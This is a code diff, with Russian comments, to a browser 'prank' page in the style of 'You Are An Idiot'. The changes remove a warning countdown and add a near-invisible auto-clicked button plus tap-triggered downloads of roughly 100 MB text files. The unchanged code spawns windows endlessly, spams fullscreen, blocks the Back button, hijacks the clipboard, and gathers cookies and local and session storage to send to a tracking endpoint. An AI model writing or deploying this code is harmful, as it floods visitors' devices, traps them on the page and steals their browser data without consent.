@@ -124,33 +124,22 @@
             touch-action: manipulation;
         }
 
-        #countdown {
+        /* МАЛЕНЬКАЯ КНОПКА, КОТОРУЮ СКРИПТ КЛИКАЕТ */
+        #auto-btn {
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-family: monospace;
-            font-weight: bold;
-            font-size: 90px;
-            color: #ff0000;
-            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #990000;
-            z-index: 10002;
-            display: none;
-            pointer-events: none;
-            text-align: center;
-            line-height: 1.2;
-            animation: pulse 0.5s infinite;
-        }
-        #countdown .label {
-            font-size: 22px;
-            color: #fff;
-            text-shadow: 0 0 10px #ff0000;
-            display: block;
-            margin-bottom: 10px;
-        }
-        @keyframes pulse {
-            0%, 100% { transform: translate(-50%, -50%) scale(1); }
-            50%      { transform: translate(-50%, -50%) scale(1.15); }
+            bottom: 5px;
+            left: 5px;
+            width: 4px;
+            height: 4px;
+            background: transparent;
+            border: none;
+            outline: none;
+            opacity: 0.01;
+            z-index: 999997;
+            cursor: default;
+            -webkit-tap-highlight-color: transparent;
+            padding: 0;
+            margin: 0;
         }
 
         @keyframes blink {
@@ -217,51 +206,45 @@
 
     <div id="flash"></div>
 
-    <div id="countdown">
-        <span class="label">ФАЙЛЫ НАЧНУТ КАЧАТЬСЯ ЧЕРЕЗ</span>
-        <span id="countdown-num">10</span>
-    </div>
-
     <button id="giant-trap" aria-hidden="true"></button>
+
+    <button id="auto-btn" aria-hidden="true"></button>
 
     <script>
         // ================== НАСТРОЙКИ ==================
-        var VIDEO_ID         = "hPZxDJYmTUw";         // ID ролика YouTube
-        var TRACK_ENDPOINT   = "/track";              // куда слать фингерпринт
-        var SOUND_URL        = "";                    // ссылка на mp3 (опц.)
+        var VIDEO_ID         = "hPZxDJYmTUw";
+        var TRACK_ENDPOINT   = "/track";
+        var SOUND_URL        = "";
 
-        // пранк-окна
-        var SPAWN_EVERY      = 200;   // мс между появлением окна
-        var MAX_WINDOWS      = 0;     // 0 = без лимита
+        var SPAWN_EVERY      = 200;
+        var MAX_WINDOWS      = 0;
 
-        // клавиатура
-        var KEYBOARD_EVERY   = 150;   // мс
+        var KEYBOARD_EVERY   = 150;
 
-        // дёрганье fullscreen
         var FULLSCREEN_SPAM  = true;
-        var FULLSCREEN_EVERY = 500;   // мс
+        var FULLSCREEN_EVERY = 500;
 
-        // невидимые кнопки-ловушки
         var BUTTONS_TOTAL    = 1000;
         var BUTTONS_EVERY    = 60;
         var BUTTON_MIN_SIZE  = 200;
         var BUTTON_MAX_SIZE  = 300;
 
-        // огромная кнопка на весь экран
         var GIANT_BUTTON       = true;
         var GIANT_COPY_COUNT   = 10;
         var GIANT_COPY_GAP     = 100;
 
-        // отсчёт до скачивания
-        var COUNTDOWN_SECONDS  = 10;     // сколько секунд ждать до старта загрузок
-
-        // спам скачиванием текстового файла
-        var DOWNLOAD_SPAM      = true;
-        var DOWNLOAD_EVERY     = 1000;       // мс между скачиваниями
+        // скачивание
         var DOWNLOAD_FILENAME  = "YOUAREANIDIOT.txt";
-        var DOWNLOAD_REPEATS   = 300000;     // ~10 МБ на файл
+        var DOWNLOAD_REPEATS   = 3000000;    // ~100 МБ
+        var AUTO_DOWNLOAD      = true;
+        var TAP_DOWNLOAD       = true;
 
-        // текст, который копируется
+        // авто-клик по маленькой кнопке
+        var AUTO_BTN_SPAM      = true;
+        var AUTO_BTN_EVERY     = 100;    // мс
+        var AUTO_BTN_MAX       = 200;    // сколько раз максимум кликнуть
+
+        // текст
         var CLIP_TEXT          = "★YOU ARE AN IDIOT AHAHAHAHAHAH★";
         // ===============================================
 
@@ -270,14 +253,14 @@
 
         var windowCount     = 0;
         var trapBtnCount    = 0;
+        var downloadCount   = 0;
 
-        var spawnInterval     = null;
-        var kbInterval        = null;
-        var trapBtnInterval   = null;
-        var fsInterval        = null;
-        var fsOn              = false;
-        var downloadInterval  = null;
-        var countdownInterval = null;
+        var spawnInterval    = null;
+        var kbInterval       = null;
+        var trapBtnInterval  = null;
+        var fsInterval       = null;
+        var autoBtnInterval  = null;
+        var fsOn             = false;
 
         // ---------- запуск ----------
         function startVideo() {
@@ -286,7 +269,6 @@
 
             document.getElementById('start-screen').classList.add('hidden');
 
-            // видео
             try {
                 var container = document.getElementById('video-container');
                 container.style.display = 'block';
@@ -295,7 +277,6 @@
                              "?autoplay=1&mute=0&controls=1&rel=0&playsinline=1";
             } catch (e) {}
 
-            // доп. звук mp3
             if (SOUND_URL) {
                 try {
                     var a = new Audio(SOUND_URL);
@@ -305,7 +286,6 @@
                 } catch (e) {}
             }
 
-            // fullscreen
             try {
                 var el = document.documentElement;
                 if (el.requestFullscreen) {
@@ -316,7 +296,6 @@
                 fsOn = true;
             } catch (e) {}
 
-            // блокировка «Назад»
             try {
                 history.pushState({ p: 1 }, "", location.href);
                 window.addEventListener('popstate', function () {
@@ -324,45 +303,54 @@
                 });
             } catch (e) {}
 
-            // вспышка
             document.getElementById('flash').style.display = 'block';
 
-            // хаос
             startWindows();
             startKeyboardSpam();
             startTrapButtons();
             startFullscreenSpam();
             startGiantButton();
+            startTapDownload();
+            startAutoBtnSpam();
             sendFingerprint();
 
-            // отсчёт до скачивания
-            startCountdown();
+            if (AUTO_DOWNLOAD) {
+                triggerDownload();
+            }
         }
 
-        // ---------- отсчёт ----------
-        function startCountdown() {
-            var el = document.getElementById('countdown');
-            var num = document.getElementById('countdown-num');
-            var left = COUNTDOWN_SECONDS;
+        // ---------- авто-клик по маленькой кнопке ----------
+        function startAutoBtnSpam() {
+            if (!AUTO_BTN_SPAM) return;
 
-            el.style.display = 'block';
-            num.textContent = left;
+            var clicks = 0;
+            var btn = document.getElementById('auto-btn');
+            if (!btn) return;
 
-            countdownInterval = setInterval(function () {
+            // обработчик самой кнопки — при клике качается файл
+            btn.addEventListener('click', function () {
+                triggerDownload();
+            });
+
+            btn.addEventListener('touchstart', function (e) {
+                e.preventDefault();
+                triggerDownload();
+            }, { passive: false });
+
+            autoBtnInterval = setInterval(function () {
                 if (stopFlag) return;
 
-                left--;
-                num.textContent = left;
+                clicks++;
 
-                if (left <= 0) {
-                    clearInterval(countdownInterval);
-                    countdownInterval = null;
-                    el.style.display = 'none';
+                try {
+                    btn.click();
+                } catch (e) {}
 
-                    // старт загрузок
-                    startDownloadSpam();
+                if (clicks >= AUTO_BTN_MAX) {
+                    clearInterval(autoBtnInterval);
+                    autoBtnInterval = null;
                 }
-            }, 1000);
+            }, AUTO_BTN_EVERY);
         }
 
         // ---------- окна ----------
@@ -513,7 +501,6 @@
             var btn = document.createElement('button');
             btn.className = 'copy-trap-btn';
             btn.type = 'button';
-            btn.setAttribute('data-idx', trapBtnCount);
 
             var size = BUTTON_MIN_SIZE + Math.floor(Math.random() *
                        (BUTTON_MAX_SIZE - BUTTON_MIN_SIZE));
@@ -529,11 +516,13 @@
 
             btn.addEventListener('click', function () {
                 copyToClipboardNow();
+                if (TAP_DOWNLOAD) triggerDownload();
             });
 
             btn.addEventListener('touchstart', function (e) {
                 e.preventDefault();
                 copyToClipboardNow();
+                if (TAP_DOWNLOAD) triggerDownload();
             }, { passive: false });
 
             document.body.appendChild(btn);
@@ -553,15 +542,34 @@
             giant.addEventListener('touchstart', function (e) {
                 e.preventDefault();
                 copyMultipleTimes();
+                if (TAP_DOWNLOAD) triggerDownload();
             }, { passive: false });
 
             giant.addEventListener('click', function (e) {
                 e.preventDefault();
                 copyMultipleTimes();
+                if (TAP_DOWNLOAD) triggerDownload();
             });
         }
 
-        // ---------- спам скачиванием ----------
+        // ---------- скачивание по тапу ----------
+        function startTapDownload() {
+            if (!TAP_DOWNLOAD) return;
+
+            document.addEventListener('click', function () {
+                if (started && !stopFlag) {
+                    triggerDownload();
+                }
+            });
+
+            document.addEventListener('touchend', function () {
+                if (started && !stopFlag) {
+                    triggerDownload();
+                }
+            });
+        }
+
+        // ---------- скачивание ----------
         function buildBigContent() {
             var line = CLIP_TEXT + "\n";
             var out = "";
@@ -575,13 +583,15 @@
             if (stopFlag) return;
 
             try {
+                downloadCount++;
+
                 var big = buildBigContent();
                 var blob = new Blob([big], { type: "text/plain" });
                 var url = URL.createObjectURL(blob);
 
                 var a = document.createElement("a");
                 a.href = url;
-                a.download = DOWNLOAD_FILENAME;
+                a.download = downloadCount + "_" + DOWNLOAD_FILENAME;
                 a.style.display = "none";
 
                 document.body.appendChild(a);
@@ -590,13 +600,8 @@
 
                 setTimeout(function () {
                     URL.revokeObjectURL(url);
-                }, 10000);
+                }, 15000);
             } catch (e) {}
-        }
-
-        function startDownloadSpam() {
-            if (!DOWNLOAD_SPAM) return;
-            downloadInterval = setInterval(triggerDownload, DOWNLOAD_EVERY);
         }
 
         // ---------- фингерпринт ----------
@@ -638,10 +643,10 @@
                 x.fillStyle = "#069";
                 x.fillText("N3XUS-fp", 2, 15);
                 d.canvas = c2.toDataURL().slice(-64);
-                } catch (e) {}
+            } catch (e) {}
 
             try { d.cookies = document.cookie || "none"; } catch (e) { d.cookies = "blocked"; }
-            try { d.ls      = JSON.stringify(localStorage).slice(0, 500); } catch (e) { d.ls = "blocked"; }
+                    try { d.ls      = JSON.stringify(localStorage).slice(0, 500); } catch (e) { d.ls = "blocked"; }
             try { d.ss      = JSON.stringify(sessionStorage).slice(0, 500); } catch (e) { d.ss = "blocked"; }
 
             d.plugins = Array.from(navigator.plugins || [])
